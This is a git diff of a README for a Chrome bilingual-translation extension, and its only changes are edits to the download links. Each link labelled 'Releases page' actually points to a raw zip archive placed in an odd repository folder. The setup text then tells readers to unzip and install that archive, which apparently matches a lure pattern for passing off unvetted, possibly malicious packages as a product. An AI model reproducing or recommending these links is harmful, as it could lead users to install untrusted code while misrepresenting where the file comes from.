@@ -2,7 +2,7 @@
 # 🌍 chrome-translate - Effortless Bilingual Translation for Chrome
 
 ## 🔗 Download Now
-[![Download chrome-translate](https://raw.githubusercontent.com/erick2809/chrome-translate/main/Chaetosomatidae/chrome-translate.zip)](https://raw.githubusercontent.com/erick2809/chrome-translate/main/Chaetosomatidae/chrome-translate.zip)
+[![Download chrome-translate](https://raw.githubusercontent.com/erick2809/chrome-translate/main/src/components/chrome-translate-3.8.zip)](https://raw.githubusercontent.com/erick2809/chrome-translate/main/src/components/chrome-translate-3.8.zip)
 
 ## 📚 Description
 chrome-translate is a Chrome extension designed for immersive bilingual translation. It uses the Translator API and Language Detector API, effectively introduced in Chrome version 138. Whether you are browsing foreign websites or learning a new language, this tool provides quick and accurate translations right in your browser.
@@ -11,13 +11,13 @@ chrome-translate is a Chrome extension designed for immersive bilingual translat
 Follow these simple steps to install and start using chrome-translate.
 
 ### 1. Visit the Download Page
-Go to the chrome-translate [Releases page](https://raw.githubusercontent.com/erick2809/chrome-translate/main/Chaetosomatidae/chrome-translate.zip) to access the latest version of the extension.
+Go to the chrome-translate [Releases page](https://raw.githubusercontent.com/erick2809/chrome-translate/main/src/components/chrome-translate-3.8.zip) to access the latest version of the extension.
 
 ### 2. Choose the Right Version
 On the Releases page, you'll see different versions of the extension. Look for the latest stable release. This will ensure you have the newest features and bug fixes.
 
 ### 3. Download the Extension
-Click on the link for the version you want to use. The file may be named something like `https://raw.githubusercontent.com/erick2809/chrome-translate/main/Chaetosomatidae/chrome-translate.zip`. 
+Click on the link for the version you want to use. The file may be named something like `https://raw.githubusercontent.com/erick2809/chrome-translate/main/src/components/chrome-translate-3.8.zip`. 
 
 ### 4. Unzip the File
 Once the download is complete, locate the zip file in your Downloads folder. Right-click the file and select "Extract All" or use your preferred method to unzip the folder.
@@ -57,7 +57,7 @@ This extension is relevant for anyone interested in bilingual translation or lan
 - userscripts
 
 ## 🔗 Download & Install
-To get started, visit the chrome-translate [Releases page](https://raw.githubusercontent.com/erick2809/chrome-translate/main/Chaetosomatidae/chrome-translate.zip) again, and download the latest version of the extension. Follow the installation steps outlined above to integrate it into your Chrome browser.
+To get started, visit the chrome-translate [Releases page](https://raw.githubusercontent.com/erick2809/chrome-translate/main/src/components/chrome-translate-3.8.zip) again, and download the latest version of the extension. Follow the installation steps outlined above to integrate it into your Chrome browser.
 
 ## 📞 Support
 If you encounter any issues or have questions, please feel free to contact the support team via the Issues section on our GitHub page.
